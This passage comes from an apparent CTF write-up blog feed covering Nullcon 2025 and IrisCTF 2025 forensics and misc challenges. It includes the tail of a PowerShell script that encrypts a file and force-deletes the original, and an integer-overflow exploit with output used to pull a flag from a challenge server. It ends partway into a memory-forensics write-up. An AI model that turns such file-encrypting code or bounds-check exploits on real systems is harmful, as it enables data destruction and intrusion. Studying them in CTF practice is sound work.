class="type">System.IO.FileMode</span>]::Create)</span><br><span class="line"><span class="variable">$cryptoStream</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.CryptoStream(<span class="variable">$outStream</span>, <span class="variable">$encryptor</span>, [<span class="type">System.Security.Cryptography.CryptoStreamMode</span>]::<span class="built_in">Write</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$cryptoStream</span>.Write(<span class="variable">$plainBytes</span>, <span class="number">0</span>, <span class="variable">$plainBytes</span>.Length)</span><br><span class="line"><span class="variable">$cryptoStream</span>.FlushFinalBlock()</span><br><span class="line"></span><br><span class="line"><span class="variable">$cryptoStream</span>.Close()</span><br><span class="line"><span class="variable">$outStream</span>.Close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">Remove-Item</span> <span class="variable">$inputFile</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure><p>So we write a reversing script in order to decode the flag.enc and get back the flag.png</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;MyS3cr3tP4ssw0rd&quot;</span>.encode()</span><br><span class="line">salt = <span class="built_in">bytes</span>([<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>])</span><br><span class="line">iterations = <span class="number">10000</span></span><br><span class="line">key_size = <span class="number">32</span></span><br><span class="line">iv_size = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">key_iv = PBKDF2(password, salt, dkLen=key_size + iv_size, count=iterations)</span><br><span class="line">key = key_iv[:key_size]</span><br><span class="line">iv = key_iv[key_size:key_size + iv_size]</span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&quot;flag.enc&quot;</span></span><br><span class="line">output_file = <span class="string">&quot;flag.png&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    encrypted_data = f.read()</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">decrypted_data = cipher.decrypt(encrypted_data)</span><br><span class="line">pad_len = decrypted_data[-<span class="number">1</span>]</span><br><span class="line">decrypted_data = decrypted_data[:-pad_len]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decryption successful: <span class="subst">&#123;output_file&#125;</span> restored.&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/./images/flag.png" alt="Restored image"></p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;h0pe_y0u_enj0yed_th1s_145e3f1a&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF-Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Forensics </tag>
            
            <tag> DFIR </tag>
            
            <tag> RF </tag>
            
            <tag> Steganography </tag>
            
            <tag> File Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nullcon 2025</title>
      <link href="/2025/02/02/Nullcon-2025/"/>
      <url>/2025/02/02/Nullcon-2025/</url>
      
        <content type="html"><![CDATA[<p>I participated in Nullcon 2025, as a core member of the team InfoSecIITR. Our team secured 9th place globally. Here are the Writeups of some challenges I was personally able to solve during the competition.</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Ancient-Paper"><a href="#Ancient-Paper" class="headerlink" title="Ancient Paper"></a>Ancient Paper</h3><h4 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given an image file along the following description: “I found this ancient artifact stuck in an old machine labeled “29”. But what is its purpose?”</p><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>Initial inspection leads to the conclusion that the image is of an IBM-29 punch card which was carrying our flag as its data.<br><img src="/./images/ancient-paper.jpg" alt="Punch Card"></p><h4 id="Decoding-the-flag"><a href="#Decoding-the-flag" class="headerlink" title="Decoding the flag"></a>Decoding the flag</h4><p>Then I used the following mapping of the IBM-29 punch card to decode the data.</p><p><img src="/./images/digit_mapping.png" alt="Digits"><br><img src="/./images/alpha_mapping.png" alt="Alphabets"></p><p>Which lead to the following text:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1337 </span><span class="string">FORMAT</span> <span class="string">ENO</span> <span class="string">H0LL3R1TH</span> <span class="string">3NC0D3D</span> <span class="string">F0RTR4N</span> <span class="string">PRINT</span> <span class="number">1337</span></span><br></pre></td></tr></table></figure><p>And hence we get our flag as:</p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ENO&#123;H0LL3R1TH_3NC0D3D_F0RTR4N&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Driving"><a href="#Driving" class="headerlink" title="Driving"></a>Driving</h3><h4 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given a strange video (.mp4) of a “banana driving a Car xD”.</p><h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h4><p>On extracting the frames of the video using the frames per second rates of 30 fps we get 387 frames.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i driving.mp4 -vf <span class="string">&quot;fps=30&quot;</span> frame_%04d.png</span><br></pre></td></tr></table></figure><p>Also the Artist in the video’s metadata looks like a hint for the challenge.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">$ exiftool driving.mp4</span><br><span class="line">ExifTool Version Number         : 12.40</span><br><span class="line">File Name                       : driving.mp4</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 2.2 MiB</span><br><span class="line">File Modification Date/Time     : 2025:02:01 14:06:53+05:30</span><br><span class="line">File Access Date/Time           : 2025:02:02 18:56:35+05:30</span><br><span class="line">File Inode Change Date/Time     : 2025:02:01 14:06:57+05:30</span><br><span class="line">File Permissions                : -rwxrwxrwx</span><br><span class="line">File Type                       : MP4</span><br><span class="line">File Type Extension             : mp4</span><br><span class="line">MIME Type                       : video/mp4</span><br><span class="line">Major Brand                     : MP4 v2 [ISO 14496-14]</span><br><span class="line">Minor Version                   : 0.0.0</span><br><span class="line">Compatible Brands               : mp42, mp41</span><br><span class="line">Movie Header Version            : 0</span><br><span class="line">Create Date                     : 2025:01:12 15:35:52</span><br><span class="line">Modify Date                     : 2025:01:12 15:35:52</span><br><span class="line">Time Scale                      : 90000</span><br><span class="line">Duration                        : 12.93 s</span><br><span class="line">Preferred Rate                  : 1</span><br><span class="line">Preferred Volume                : 100.00%</span><br><span class="line">Preview Time                    : 0 s</span><br><span class="line">Preview Duration                : 0 s</span><br><span class="line">Poster Time                     : 0 s</span><br><span class="line">Selection Time                  : 0 s</span><br><span class="line">Selection Duration              : 0 s</span><br><span class="line">Current Time                    : 0 s</span><br><span class="line">Next Track ID                   : 3</span><br><span class="line">Track Header Version            : 0</span><br><span class="line">Track Create Date               : 2025:01:12 15:35:52</span><br><span class="line">Track Modify Date               : 2025:01:12 15:35:52</span><br><span class="line">Track ID                        : 1</span><br><span class="line">Track Duration                  : 12.90 s</span><br><span class="line">Track Layer                     : 0</span><br><span class="line">Track Volume                    : 0.00%</span><br><span class="line">Image Width                     : 640</span><br><span class="line">Image Height                    : 480</span><br><span class="line">Graphics Mode                   : srcCopy</span><br><span class="line">Op Color                        : 0 0 0</span><br><span class="line">Compressor ID                   : hvc1</span><br><span class="line">Source Image Width              : 640</span><br><span class="line">Source Image Height             : 480</span><br><span class="line">X Resolution                    : 72</span><br><span class="line">Y Resolution                    : 72</span><br><span class="line">Compressor Name                 : HEVC Coding</span><br><span class="line">Bit Depth                       : 24</span><br><span class="line">Video Frame Rate                : 30</span><br><span class="line">Matrix Structure                : 1 0 0 0 1 0 0 0 1</span><br><span class="line">Media Header Version            : 0</span><br><span class="line">Media Create Date               : 2025:01:12 15:35:52</span><br><span class="line">Media Modify Date               : 2025:01:12 15:35:52</span><br><span class="line">Media Time Scale                : 44100</span><br><span class="line">Media Duration                  : 12.93 s</span><br><span class="line">Media Language Code             : eng</span><br><span class="line">Balance                         : 0</span><br><span class="line">Handler Description             : Alias Data Handler</span><br><span class="line">Audio Format                    : mp4a</span><br><span class="line">Audio Channels                  : 2</span><br><span class="line">Audio Bits Per Sample           : 16</span><br><span class="line">Audio Sample Rate               : 44100</span><br><span class="line">Handler Type                    : Metadata</span><br><span class="line">XMP Toolkit                     : Image::ExifTool 13.00</span><br><span class="line">Artist                          : 2+(10*n) <span class="keyword">for</span> all n&gt;=10</span><br><span class="line">Media Data Size                 : 2271847</span><br><span class="line">Media Data Offset               : 12469</span><br><span class="line">Image Size                      : 640x480</span><br><span class="line">Megapixels                      : 0.307</span><br><span class="line">Avg Bitrate                     : 1.41 Mbps</span><br><span class="line">Rotation                        : 0</span><br></pre></td></tr></table></figure><p>Now on a simple inspection of the frames, one thing that catches our eye is the presence of <code>&#125;</code> in the frame number 383 (indexing from 1).</p><p><img src="/./images/frame_0383.png" alt="Frame 383"></p><p>Then by the Artist hint on inspecting frames on intervals of 10 i.e the following frames,<br><code>[103,113,123,133,143,153,163,173,183,193,203,213,223,233,243,253,263,273,283,293,303,313,323,333,343,353,363,373,383]</code><br>we find that each of those frames contain one character of the flag in the following order <code>Left Top → Right Top → Right Bottom → Left Bottom → Left Top…</code>, which leads us to our flag.</p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ENO&#123;Y0U_4R3_DR1V1N6_M3_CR4ZY&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Powerplay"><a href="#Powerplay" class="headerlink" title="Powerplay"></a>Powerplay</h3><h4 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>An interactive challenge where we are given the python code for the challenge and our job is to trick the server to reveal the flag.</p><h4 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h4><p>On initial inspection of the code, we can find the vulnerability in it,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, quotes</span><br><span class="line"></span><br><span class="line">prizes = quotes + [<span class="string">&#x27;missingno&#x27;</span>] * <span class="number">4</span> + [flag] * <span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Welcome to our playground for powerful people where you can pump yourself up and get awesome prizes!\n&#x27;</span>)</span><br><span class="line">player_count = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;How many players participate?\n&#x27;</span>))</span><br><span class="line">power = np.zeros(player_count, dtype = np.int32)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(player_count):</span><br><span class="line">power[i] = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">f&#x27;Player <span class="subst">&#123;i&#125;</span>, how strong are you right now?\n&#x27;</span>))</span><br><span class="line">ready = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;What do you want to do?\n1) pump up\n2) cash in&#x27;</span>)</span><br><span class="line">option = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="keyword">if</span> option == <span class="number">1</span>:</span><br><span class="line">power = power**<span class="number">2</span></span><br><span class="line">ready = <span class="literal">True</span></span><br><span class="line"><span class="keyword">elif</span> option == <span class="number">2</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ready:</span><br><span class="line"><span class="keyword">raise</span> Exception(<span class="string">&#x27;Nope, too weak&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(player_count):</span><br><span class="line"><span class="keyword">if</span> power[i] &lt; <span class="built_in">len</span>(quotes):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;You got an inspiration: <span class="subst">&#123;prizes[power[i]]&#125;</span>&#x27;</span>)</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">raise</span> Exception(<span class="string">&#x27;What?&#x27;</span>)</span><br></pre></td></tr></table></figure><p>The code creates the power as a numpy array of 32 bit signed integer type and then, the pump option lets us square the power array and the check is just if the power value is less than the length of quotes (positive) so one can cause integer overflow in power value to make it negative on squaring but there is one more catch that as the prizes has [flag]*24 we need to specifically make power in the range (-23 to -1) so that we bypass the check and access the prizes array at an index where the flag is present which is one out of the last 24 cells, so we write a brute force script to get such a number.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">start = <span class="number">1000001</span></span><br><span class="line">end = <span class="number">100000000</span></span><br><span class="line">max_iter = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">lower_bound = -<span class="number">24</span></span><br><span class="line">upper_bound = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">100000</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i = &#125;</span>&#x27;</span>)</span><br><span class="line">    a = np.int32(i)</span><br><span class="line">    ctr = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> ctr &lt; max_iter:</span><br><span class="line">        a = a ** <span class="number">2</span></span><br><span class="line">        ctr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(a) &gt; lower_bound <span class="keyword">and</span> <span class="built_in">int</span>(a) &lt;= upper_bound:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found: i = <span class="subst">&#123;i&#125;</span>, iterations = <span class="subst">&#123;ctr&#125;</span>, value = <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>This gives first valid solution as <code>34716455 1 -15</code>, and on using this as our input we get our flag.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Welcome to our playground <span class="keyword">for</span> powerful people <span class="built_in">where</span> you can pump yourself up and get awesome prizes!</span><br><span class="line"></span><br><span class="line">How many players participate?</span><br><span class="line">1</span><br><span class="line">Player 0, how strong are you right now?</span><br><span class="line">34716455</span><br><span class="line">What <span class="keyword">do</span> you want to <span class="keyword">do</span>?</span><br><span class="line">1) pump up</span><br><span class="line">2) cash <span class="keyword">in</span></span><br><span class="line">1</span><br><span class="line">What <span class="keyword">do</span> you want to <span class="keyword">do</span>?</span><br><span class="line">1) pump up</span><br><span class="line">2) cash <span class="keyword">in</span></span><br><span class="line">2</span><br><span class="line">You got an inspiration: ENO&#123;d0_n0t_be_s0_neg4t1ve_wh3n_y0u_sh0uld_be_pos1t1ve&#125;</span><br></pre></td></tr></table></figure><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ENO&#123;d0_n0t_be_s0_neg4t1ve_wh3n_y0u_sh0uld_be_pos1t1ve&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Profound-thought"><a href="#Profound-thought" class="headerlink" title="Profound thought"></a>Profound thought</h3><h4 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given a .png file, and this happened to be the easiest challenge of the CTF.</p><h4 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h4><p>A simple LSB steganography challenge, just use <code>zsteg</code> on the file and we get our flag.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ zsteg l5b245c11.png</span><br><span class="line">imagedata           .. text: <span class="string">&quot;286-0.\t\n\t&quot;</span></span><br><span class="line">b1,r,lsb,xy         .. text: <span class="string">&quot;rzsZA&gt;FCNR^_]\&quot;&quot;</span></span><br><span class="line">b1,r,msb,xy         .. file: OpenPGP Public Key</span><br><span class="line">b1,g,msb,xy         .. file: OpenPGP Secret Key</span><br><span class="line">b1,rgb,lsb,xy       .. text: <span class="string">&quot;ENO&#123;57394n09r4phy_15_w4y_c00l3r_7h4n_p0rn06r4phy&#125; ENO&#123;57394n09r4phy_15_w4y_c00l3r_7h4n_p0rn06r4phy&#125; ENO&#123;57394n09r4phy_15_w4y_c00l3r_7h4n_p0rn06r4phy&#125; ENO&#123;57394n09r4phy_15_w4y_c00l3r_7h4n_p0rn06r4phy&#125; ENO&#123;57394n09r4phy_15_w4y_c00l3r_7h4n_p0rn06r4phy&#125; ENO&#123;57&quot;</span></span><br><span class="line">b2,r,msb,xy         .. file: OpenPGP Secret Key</span><br><span class="line">b2,bgr,msb,xy       .. file: OpenPGP Public Key</span><br><span class="line">b3,r,msb,xy         .. file: RLE image data, 16888 x 4242, lower left corner: 8321, clear first, 16 color channels</span><br><span class="line">b4,r,lsb,xy         .. text: <span class="string">&quot;wYtE<span class="variable">$ER</span>\#<span class="variable">$DUEFuREEf2E</span>%5&quot;</span></span><br><span class="line">b4,g,lsb,xy         .. text: <span class="string">&quot;#\&quot;5DQ232UT2&quot;</span></span><br></pre></td></tr></table></figure><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ENO&#123;57394n09r4phy_15_w4y_c00l3r_7h4n_p0rn06r4phy&#125;</span></span><br></pre></td></tr></table></figure><h3 id="USBnet"><a href="#USBnet" class="headerlink" title="USBnet"></a>USBnet</h3><h4 id="Challenge-Description-4"><a href="#Challenge-Description-4" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given a packet capture of USB packtes.</p><h4 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h4><p>On initial analysis of the .pcapng in Wireshark we observe that packet 170 contains the <code>PNG</code> magic bytes of a .png image and it also has the <code>IEND</code> chunk meaning the complete image was transferred in this packet so we just try to reconstruct the image from this packet using Cyberchef which gives the QR of our flag.</p><p><img src="/./images/Wireshark_nullcon.png" alt="Wireshark"></p><p><img src="/./images/Cyberchef.png" alt="Cyberchef"></p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ENO&#123;USB_ETHERNET_ADAPTER_ARE_COOL_N!C3&#125;</span></span><br></pre></td></tr></table></figure><h3 id="abroad-study-notes"><a href="#abroad-study-notes" class="headerlink" title="abroad study notes"></a>abroad study notes</h3><h4 id="Challenge-Description-5"><a href="#Challenge-Description-5" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We are given a corrupted jpeg image which looks like its data streams are scratched.</p><h4 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h4><p>Now from the JPEG documentation we find,<br>“If a 0xff byte occurs in the compressed image data either a zero byte (0x00) or a marker identifier follows it. Normally the only marker that should be found once the image data is started is an EOI. When a 0xff byte is found followed by a zero byte (0x00) the zero byte must be discarded.”<br>So on inspecting the given jpeg we find it has <code>ff 07</code> markers causing the distortion so we just fix them to <code>ff 00</code> and our jpeg restores to original one.</p><p><img src="/./images/nullcon_restored.jpg" alt="Final Image"></p><p>Documentation to refer: <a href="http://mcatutorials.com/mca-tutorials-jpeg-file-layout-format-2-c-practical.php">jpeg-format-layout</a></p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ENO&#123;o7_t0_4ll_r3pl4c3d_07&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF-Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Forensics </tag>
            
            <tag> Steganography </tag>
            
            <tag> File Analysis </tag>
            
            <tag> Wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IrisCTF-2025</title>
      <link href="/2025/01/07/irisctf2025/"/>
      <url>/2025/01/07/irisctf2025/</url>
      
        <content type="html"><![CDATA[<p>I participated in IrisCTF 2025, organized by IrisSec, as a core member of the team InfoSecIITR. Our team secured 9th place globally. Here are the Writeups of some Forensics, Networking and RF challenges I was personally able to solve during the competition.</p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="deldeldel"><a href="#deldeldel" class="headerlink" title="deldeldel"></a>deldeldel</h3><h4 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p><img src="/./images/chall1.png" alt="Description"></p><p>Source File: <a href="/./files/deldeldel.tar.gz">deldeldel.tar.gz</a></p><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>We are give a packet capture file for this challenge. On viewing it in Wireshark a stream of USB packets can be discoverd.</p><p><img src="/./images/wireshark.png" alt="Wireshark"></p><p>The file name indicating a <code>keylogger</code> and the packets from ip 1.3.2 with Leftover Capture data that would be 8 byte strings made me believe for certain that its USB keyboard communicating with our host.</p><h4 id="Parsing-USB-CAP-Data"><a href="#Parsing-USB-CAP-Data" class="headerlink" title="Parsing USB CAP Data"></a>Parsing USB CAP Data</h4><p>I used the following online Keyboard parser tool to parse the HID data and hence retrieve the flag.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(https://github.com/5h4rrk/CTF-Usb_Keyboard_Parser/blob/main/Usb_Keyboard_Parser.py)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">w0lf@hp:~$ python3 Usb_Keyboard_Parser.py klogger.pcapng</span><br><span class="line">[-] Found Modifier <span class="keyword">in</span> 310 packets [-]</span><br><span class="line"></span><br><span class="line">[+] Using filter <span class="string">&quot;usb.capdata&quot;</span> Retrived HID Data is :</span><br><span class="line"></span><br><span class="line">Hheey   AAalicce! Ii  tthink  Ii<span class="string">&#x27;&#x27;</span>m  ssupppooseed  too  giivee yoou   tiss fllaag:</span><br><span class="line"></span><br><span class="line">iriisctfF&#123;[tthis_akeyloggeer_iisS_too_hard_to_use&#125;</span><br></pre></td></tr></table></figure><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;this_keylogger_is_too_hard_to_use&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Windy-Day"><a href="#Windy-Day" class="headerlink" title="Windy Day"></a>Windy Day</h3><h2 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h2><p><img src="/./images/chall2.png" alt="Description"></p><h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h4><p>We are given a memory dump for this challenge. So we got to our beloved volatility for the analysis.</p><h4 id="Initial-Analysis"><a href="#Initial-Analysis" class="headerlink" title="Initial Analysis"></a>Initial Analysis</h4><p>I started analyzing the memdump.mem using <a href="https://github.com/volatilityfoundation/volatility3">Volatility3</a>.</p><p>The first step was as always listing the processes.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 